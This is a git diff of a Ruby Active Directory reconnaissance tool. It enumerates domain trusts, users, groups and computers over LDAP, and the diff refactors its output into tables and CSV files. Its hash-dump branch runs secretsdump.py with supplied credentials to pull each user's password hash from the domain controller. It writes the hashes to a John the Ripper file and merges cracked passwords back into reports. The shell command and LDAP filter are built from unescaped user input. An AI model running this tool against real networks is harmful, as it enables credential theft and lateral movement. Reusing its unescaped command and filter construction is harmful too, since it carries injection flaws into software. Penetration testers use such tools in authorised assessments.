@@ -8,8 +8,9 @@ require 'trollop'
 require 'colorize'
 require 'yaml'
 require 'csv'
-require './objects.rb'
-
+require_relative './objects.rb'
+require 'pp'
+require 'terminal-table'
 
 Signal.trap("INT") { 
   shut_down 
@@ -55,7 +56,9 @@ opts = Trollop::options do
 	opt :cracked, "A list of cracked credentials from which to add to the users output", :type => :string
 	opt :csv, "CSV output", :type => :boolean
 	opt :restore, "Restore from YAML log file", :type => :string
+	opt :redacted, "Output to CSV without sensitive information", :type => :boolean
 end
+
 if opts[:all]
 	puts "Running all functions...".green
 	opts[:enumtrusts] = true
@@ -114,7 +117,6 @@ unless opts[:restore]
 else
 	YAML.load_file(opts[:restore]).each do |object|
 		if object.is_a? User
-			# puts "parsed user"
 			User.all_users << object
 		elsif object.is_a? Group
 			# puts "parsed group"
@@ -126,174 +128,179 @@ else
 	end
 end
 
-if opts[:enumtrusts]
-	puts "Enumerating Domain Trusts...".green
+unless opts[:restore]
+	if opts[:enumtrusts]
+		puts "Enumerating Domain Trusts...".green
 
-	ldap_con.search( :base => treebase, :filter => Domain.domain_info) do |entry|
-		puts "\nQueried Domain Name: #{entry.dc.entries.reduce}"
-		puts "Queried Domain TLD: #{entry.dn.split("DC=")[-1]}"
-		puts "Queried DC: #{entry.masteredby.entries.to_s.split("CN=")[2]}\n\n"
-		Domain.current(entry)
-	end
-	ldap_con.search( :base => treebase, :filter => Domain.find_trusts) do |entry|
-		Domain.new(entry)
-	end
-	Domain.all_domains.each do |trust|
-		puts "---------------------------"
-		puts "Domain Name: #{trust.name}"
-		puts "Trust Direction: #{trust.trust_direction}"
-		puts "Trust Type: #{trust.trust_type}"
-		puts "Trust Attributes: #{trust.trust_attributes}\n"
-		puts "Relation: #{trust.relation}"
-	end
-end
-
-if opts[:queryuser]
-	puts "Quering user #{opts[:queryuser]}...\n".green
-	ldap_con.search( :base => treebase, :filter => User.find_user(opts[:queryuser])) do |entry|
-		member_of = []
-		ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs| #use the recursive member of function
-			member_of << memberofs.name
+		ldap_con.search( :base => treebase, :filter => Domain.domain_info) do |entry|
+			puts "\nQueried Domain Name: #{entry.dc.entries.reduce}"
+			puts "Queried Domain TLD: #{entry.dn.split("DC=")[-1]}"
+			puts "Queried DC: #{entry.masteredby.entries.to_s.split("CN=")[2]}\n\n"
+			Domain.current(entry)
 		end
-		User.new(entry, member_of)
-			User.all_users.each do |u|
-				puts "Username: #{u.name}"
-				puts "Admin: #{u.admin}"
-				puts "Enabled: #{u.enabled}"
-				puts "Logon Count: #{u.logon_count}"
-				puts "Member of: #{u.member_of.join(", ")}"
-				puts "Created: #{u.when_created}"
-				puts "Modified: #{u.when_changed}"
-				puts "Last incorrect password attempt: #{u.bad_password_time}"
-				puts "Expires: #{u.account_expires}"
-				puts "Last Logon: #{u.last_logon}"
-				puts "Descriptions: #{u.description}"
-			end
-	end
-	if User.all_users.empty?
-		puts "Couldn't find user: #{opts[:queryuser]}".red
-	end
-end
-
-#find all groups
-if opts[:enumgroups]
-	puts "Parsing groups...\n".green
-	ldap_con.search( :base => treebase, :filter => Group.find_all_groups()) do |entry|
-		i = Group.new(entry, nil)
-		member_of = []
-		ldap_con.search( :base => treebase, :filter => Group.recursive_memberof(i)) do |memberofs| #use the recursive member of function
-			i.members << memberofs.name
-			User.new(memberofs, nil)
+		ldap_con.search( :base => treebase, :filter => Domain.find_trusts) do |entry|
+			Domain.new(entry)
 		end
-		puts "Group Name: #{i.name} - Members: #{i.members.count}"
+		Domain.all_domains.each do |trust|
+			puts "---------------------------"
+			puts "Domain Name: #{trust.name}"
+			puts "Trust Direction: #{trust.trust_direction}"
+			puts "Trust Type: #{trust.trust_type}"
+			puts "Trust Attributes: #{trust.trust_attributes}\n"
+			puts "Relation: #{trust.relation}"
+		end
 	end
-end
 
-if opts[:enumallusers]
-	puts "Enumerating all users...\n".green
-		ldap_con.search( :base => treebase, :filter => User.find_all_users) do |entry|
+	if opts[:queryuser]
+		puts "Quering user #{opts[:queryuser]}...\n".green
+		ldap_con.search( :base => treebase, :filter => User.find_user(opts[:queryuser])) do |entry|
 			member_of = []
 			ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs| #use the recursive member of function
 				member_of << memberofs.name
 			end
-			u = User.new(entry, member_of)
-			puts "Name: #{u.name} - Admin: #{u.admin} - Description: #{u.description}"
-		end
-		puts "\nFound #{User.all_users.count} users".green
-end
-
-if opts[:domaincomputers]
-	if opts[:domaincomputers] == "all"
-		filter = Computer.find_all_computers
-	elsif opts[:domaincomputers] == "workstations"
-		filter = Computer.find_all_workstations
-	elsif opts[:domaincomputers] == "servers"
-		filter = Computer.find_all_servers
-	elsif opts[:domaincomputers] == "domaincontrollers"
-		filter = Computer.find_all_domaincontrollers
-	end
-	ldap_con.search( :base => treebase, :filter => filter) do |entry|
-		Computer.new(entry)
-	end
-	puts "Enumerating computers, type: #{opts[:domaincomputers]}".green
-	puts "Name:OS:DNS:IP"
-	Computer.all_computers.each do |c|
-		puts "#{c.cn}:#{c.os}:#{c.dns}:#{c.ip}"
-	end
-	puts "------------------\n"
-end
-
-
-if opts[:groupname]
-	#search for the group and create a Group object with the attributes
-	ldap_con.search( :base => treebase, :filter => Net::LDAP::Filter.construct("(name=#{opts[:groupname]}))")) do |entry|
-		member_obj = entry.member rescue []
-		Group.new(entry,member_obj)
-	end
-	Group.find_group(opts[:groupname])
-
-	unless Group.all_groups.empty?
-		puts "Found Group: #{opts[:groupname]}, Objects: #{Group.search_group.members.count}".green
-	else
-		puts "Unable to find group \"#{opts[:groupname]}\", is the TLD correct?".red
-		exit
-	end
-
-	# use the memberof LDAP query to pull back all users and nested users in the group
-	ldap_con.search( :base => treebase, :filter => Group.recursive_memberof(Group.search_group)) do |entry|
-		member_of = entry.memberof.entries.reduce rescue nil
-		u = User.new(entry, member_of)
-		puts "Name: #{u.name} - admin: #{u.admin}"
-	end
-
-	User.all_users.each do |user|
-		Group.search_group.members.each do |group|
-			begin
-				if user.member_of.include? group
-					linked = group.split(",")[0]
-					user.link = linked.gsub(/CN=/, '')
+			User.new(entry, member_of)
+				User.all_users.each do |u|
+					puts "Username: #{u.name}"
+					puts "Admin: #{u.admin}"
+					puts "Enabled: #{u.enabled}"
+					puts "Logon Count: #{u.logon_count}"
+					puts "Member of: #{u.member_of.join(", ")}"
+					puts "Created: #{u.when_created}"
+					puts "Modified: #{u.when_changed}"
+					puts "Last incorrect password attempt: #{u.bad_password_time}"
+					puts "Expires: #{u.account_expires}"
+					puts "Last Logon: #{u.last_logon}"
+					puts "Descriptions: #{u.description}"
 				end
-			rescue
-			end
+		end
+		if User.all_users.empty?
+			puts "Couldn't find user: #{opts[:queryuser]}".red
 		end
 	end
-end
 
-catch :nopriv do #err, I think this works...
-	if opts[:dumphashes]
+	#find all groups
+	if opts[:enumgroups]
+		puts "Parsing groups...\n".green
+		ldap_con.search( :base => treebase, :filter => Group.find_all_groups()) do |entry|
+			i = Group.new(entry, nil)
+			member_of = []
+			ldap_con.search( :base => treebase, :filter => Group.recursive_memberof(i)) do |memberofs| #use the recursive member of function
+				i.members << memberofs.name
+				User.new(memberofs, nil)
+			end
+			puts "Group Name: #{i.name} - Members: #{i.members.count}"
+		end
+	end
+
+	if opts[:enumallusers]
+		puts "Enumerating all users...\n".green
+			ldap_con.search( :base => treebase, :filter => User.find_all_users) do |entry|
+				member_of = []
+				ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs| #use the recursive member of function
+					member_of << memberofs.name
+				end
+				u = User.new(entry, member_of)
+				puts "Name: #{u.name} - Admin: #{u.admin} - Description: #{u.description}"
+			end
+			puts "\nFound #{User.all_users.count} users".green
+	end
+
+	if opts[:domaincomputers]
+		if opts[:domaincomputers] == "all"
+			filter = Computer.find_all_computers
+		elsif opts[:domaincomputers] == "workstations"
+			filter = Computer.find_all_workstations
+		elsif opts[:domaincomputers] == "servers"
+			filter = Computer.find_all_servers
+		elsif opts[:domaincomputers] == "domaincontrollers"
+			filter = Computer.find_all_domaincontrollers
+		end
+		ldap_con.search( :base => treebase, :filter => filter) do |entry|
+			Computer.new(entry)
+		end
+		puts "Enumerating computers, type: #{opts[:domaincomputers]}".green
+
+		rows = []
+		Computer.all_computers.each do |c|
+			# puts "#{c.cn}:#{c.os}:#{c.dns}:#{c.ip}"
+			rows << [c.cn, c.os, c.sp, c.dns, c.ip]
+		end
+		table = Terminal::Table.new :headings => ["Name", "Operating System", "Service Pack", "DNS", "IP Address"], :rows => rows
+		puts table
 		puts "------------------\n"
-		puts "Dumping Hashes...\nHashes:".green
-		#dump the hashes
-		# Child domain enumeration doesnt work
-		User.all_users.uniq! {|u| u.name}
-		unless User.all_users.empty?
-			User.all_users.each do |user|
-				output = ''
-				cmd = TTY::Command.new(output: output)
-				#this path is correct in both OSX and Kali
-				connection = cmd.run("python /usr/local/bin/secretsdump.py #{opts[:domain]}/#{opts[:username]}\:\"#{opts[:password]}\"\@#{opts[:host]} -just-dc-user \"#{opts[:domain]}/#{user.name}\"")
-				unless connection.out =~ /ERROR_DS_DRA_ACCESS_DENIED|ERROR_DS_DRA_BAD_DN/ #secretsdump doesnt output to STDERR, annoyingly
-					user.hash = connection.out.split("\n")[4]
-					User.hash_type(user)
-					puts user.hash
-				else
-					puts "Not enough privilege, aborting hashdump".red
-					throw :nopriv
-				end
-			end
-			puts "\nWriting to JTR readable format".green
-			File.open("spotlight_to_john.txt", "w+") do |line|
-				User.all_users.each do |user|
-					line << "#{user.hash}\n"
-				end
-			end
+	end
+
+
+	if opts[:groupname]
+		#search for the group and create a Group object with the attributes
+		ldap_con.search( :base => treebase, :filter => Net::LDAP::Filter.construct("(name=#{opts[:groupname]}))")) do |entry|
+			member_obj = entry.member rescue []
+			Group.new(entry,member_obj)
+		end
+		Group.find_group(opts[:groupname])
+
+		unless Group.all_groups.empty?
+			puts "Found Group: #{opts[:groupname]}, Objects: #{Group.search_group.members.count}".green
 		else
-			puts "No Users, aborting hashdump".red
-			throw :nopriv
+			puts "Unable to find group \"#{opts[:groupname]}\", is the TLD correct?".red
+			exit
+		end
+
+		# use the memberof LDAP query to pull back all users and nested users in the group
+		ldap_con.search( :base => treebase, :filter => Group.recursive_memberof(Group.search_group)) do |entry|
+			member_of = entry.memberof.entries.reduce rescue nil
+			u = User.new(entry, member_of)
+			puts "Name: #{u.name} - admin: #{u.admin}"
+		end
+
+		User.all_users.each do |user|
+			Group.search_group.members.each do |group|
+				begin
+					if user.member_of.include? group
+						linked = group.split(",")[0]
+						user.link = linked.gsub(/CN=/, '')
+					end
+				rescue
+				end
+			end
+		end
+	end
+
+	catch :nopriv do #err, I think this works...
+		if opts[:dumphashes]
+			puts "------------------\n"
+			puts "Dumping Hashes...\nHashes:".green
+			#dump the hashes
+			# Child domain enumeration doesnt work
+			User.all_users.uniq! {|u| u.name}
+			unless User.all_users.empty?
+				User.all_users.each do |user|
+					output = ''
+					cmd = TTY::Command.new(output: output)
+					#this path is correct in both OSX and Kali
+					connection = cmd.run("python /usr/local/bin/secretsdump.py #{opts[:domain]}/#{opts[:username]}\:\"#{opts[:password]}\"\@#{opts[:host]} -just-dc-user \"#{opts[:domain]}/#{user.name}\"")
+					unless connection.out =~ /ERROR_DS_DRA_ACCESS_DENIED|ERROR_DS_DRA_BAD_DN/ #secretsdump doesnt output to STDERR, annoyingly
+						user.hash = connection.out.split("\n")[4]
+						User.hash_type(user)
+						puts user.hash
+					else
+						puts "Not enough privilege, aborting hashdump".red
+						throw :nopriv
+					end
+				end
+				puts "\nWriting to JTR readable format".green
+				File.open("spotlight_to_john.txt", "w+") do |line|
+					User.all_users.each do |user|
+						line << "#{user.hash}\n"
+					end
+				end
+			else
+				puts "No Users, aborting hashdump".red
+				throw :nopriv
+			end
 		end
 	end
 end
-
 if opts[:cracked]
 	File.readlines(opts[:cracked]).each do |i|
 		User.cracked(i)
@@ -302,17 +309,27 @@ end
 #Some CSV output
 if opts[:csv]
 	puts "Writing CSV Files".green
-	if opts[:groupname] || opts[:restore]
-		unless User.all_users.empty?
-			CSV.open("users_output.csv", "w+") do |csv|
-				csv << ["Username", "Group", "Linked Group", "Logon Count", "Hash", "Hash Type", "Password"]
-				User.all_users.each do |user|
-					csv << [user.name, opts[:groupname],user.link, user.logon_count, user.hash, user.hash_type, user.password]
+
+	unless User.all_users.empty?
+		CSV.open("users_output.csv", "w+") do |csv|
+			csv << ["Username", "Admin", "Enabled", "Logon Count", "Member of", "Description", "Created", "Changed", "Password Last Changed", "Last bad password attempt", "Expires", "Hash", "Hash Type", "Password"]
+			User.all_users.each do |user|
+				if opts[:redacted]
+					if user.password.nil?
+						password = "Not Cracked"
+					else
+						password = "Cracked"
+					end
+					hash = "REDACTED"
+				else
+					password = user.password
+					hash = user.hash
 				end
+				csv << [user.name, user.admin, user.enabled, user.logon_count, user.member_of.join(", "), user.description, user.when_created, user.when_changed, user.pwdlastset, user.bad_password_time, user.account_expires, hash, user.hash_type, password]
 			end
 		end
 	end
-	if opts[:enumgroups] 
+	unless Group.all_groups.empty?
 		CSV.open("allgroups_output.csv", "w+") do |csv|
 			csv << ["Group", "Admin?", "Members"]
 			Group.all_groups.each do |grp|
@@ -321,25 +338,72 @@ if opts[:csv]
 		end
 	end
 
-	if opts[:enumallusers]
-		CSV.open("allusers_output.csv", "w+") do |csv|
-			csv << ["Username", "Admin?", "Created", "Changed", "Password Last Changed", "Last bad password attempt","Expires","Enabled?","Logon Count","Hash", "Hash Type", "Password", "Member Of"]
-			User.all_users.each do |usr|
-				usr.member_of = [] if usr.member_of.nil?
-				csv << [usr.name, usr.admin, usr.when_created, usr.when_changed, usr.pwdlastset ,usr.bad_password_time, usr.account_expires, usr.enabled, usr.logon_count, usr.hash, usr.hash_type, usr.password, usr.member_of.join(", ")]
-			# ^ Not exactly following the Ruby format guidelines
-			end
-		end
-	end
-
-	if opts[:domaincomputers] || opts[:restore] && opts[:domaincomputers]
-		CSV.open("computer_output.csv", "w+") do |csv|
+	unless Computer.all_computers.empty?
+		CSV.open("allcomputers_output.csv", "w+") do |csv|
 			csv << ["Name","OS","DNS","IP"]
 			Computer.all_computers.each do |computer|
 				csv << [computer.cn, computer.os, computer.dns, computer.ip]
 			end
 		end
 	end
+
+	unless Domain.all_domains.empty?
+		CSV.open("alldomains_output.csv", "w+") do |csv|
+			csv << ["Name","Trust Direction","Trust Type","Trust Attributes", "Relation"]
+			Domain.all_domains.each do |domain|
+				csv << [domain.name, domain.trust_direction, domain.trust_type, domain.trust_attributes, domain.relation]
+			end
+		end
+	end
+
+	if opts[:groupname]
+		unless User.all_users.empty?
+			CSV.open("group_link.csv", "w+") do |csv|
+				csv << ["Username", "Group", "Linked Group", "Logon Count", "Hash", "Hash Type", "Password"]
+				User.all_users.each do |user|
+					csv << [user.name, opts[:groupname],user.link, user.logon_count, user.hash, user.hash_type, user.password]
+				end
+			end
+		end
+	end
+	# if opts[:groupname] || opts[:restore]
+	# 	unless User.all_users.empty?
+	# 		CSV.open("users_output.csv", "w+") do |csv|
+	# 			csv << ["Username", "Group", "Linked Group", "Logon Count", "Hash", "Hash Type", "Password"]
+	# 			User.all_users.each do |user|
+	# 				csv << [user.name, opts[:groupname],user.link, user.logon_count, user.hash, user.hash_type, user.password]
+	# 			end
+	# 		end
+	# 	end
+	# end
+	# if opts[:enumgroups] 
+	# 	CSV.open("allgroups_output.csv", "w+") do |csv|
+	# 		csv << ["Group", "Admin?", "Members"]
+	# 		Group.all_groups.each do |grp|
+	# 			csv << [grp.name, grp.admin, grp.members.join(", ")]
+	# 		end
+	# 	end
+	# end
+
+	# if opts[:enumallusers]
+	# 	CSV.open("allusers_output.csv", "w+") do |csv|
+	# 		csv << ["Username", "Admin?", "Created", "Changed", "Password Last Changed", "Last bad password attempt","Expires","Enabled?","Logon Count","Hash", "Hash Type", "Password", "Member Of"]
+	# 		User.all_users.each do |usr|
+	# 			usr.member_of = [] if usr.member_of.nil?
+	# 			csv << [usr.name, usr.admin, usr.when_created, usr.when_changed, usr.pwdlastset ,usr.bad_password_time, usr.account_expires, usr.enabled, usr.logon_count, usr.hash, usr.hash_type, usr.password, usr.member_of.join(", ")]
+	# 		# ^ Not exactly following the Ruby format guidelines
+	# 		end
+	# 	end
+	# end
+
+	# if opts[:domaincomputers] || opts[:restore] && opts[:domaincomputers]
+	# 	CSV.open("computer_output.csv", "w+") do |csv|
+	# 		csv << ["Name","OS","DNS","IP"]
+	# 		Computer.all_computers.each do |computer|
+	# 			csv << [computer.cn, computer.os, computer.dns, computer.ip]
+	# 		end
+	# 	end
+	# end
 end
 
 
@@ -347,7 +411,7 @@ unless opts[:restore]
 	begin
 		puts "\nWriting YAML files for logs".green
 		array = [ Group.search_group, Group.all_groups, Computer.all_computers, User.all_users, Domain.all_domains]
-		File.write("./logs/connection_data.yaml", array.flatten.to_yaml)
+		File.write("#{Time.now.strftime('%Y-%m-%d_%H-%M-%S')}_connection_data.yaml", array.flatten.to_yaml)
 	rescue => e
 		puts "Something went wrong \"#{e}\""
 	end
